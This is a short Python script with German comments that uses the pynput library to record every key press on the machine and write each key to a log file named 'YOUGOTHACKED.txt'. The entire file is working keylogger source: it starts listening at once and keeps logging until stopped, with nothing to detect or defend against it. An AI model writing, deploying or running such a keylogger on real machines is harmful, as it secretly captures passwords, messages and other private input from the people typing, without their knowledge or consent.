import logging

from pynput.keyboard import Key, Listener
from logging import *

logging.basicConfig(
    filename= ("YOUGOTHACKED.txt"),
    level= logging.DEBUG,
    format='%(message)s'
)

# Diese funktion soll die taste name fangen und speichern
def catchTheKey(key):
    logging.info(str(key))


# zuhörer startet bei beginn auf dem tastetur zu drücken und verkettet alle die registierte tasten
with Listener(on_press=catchTheKey) as zuhoerer:
    zuhoerer.join()



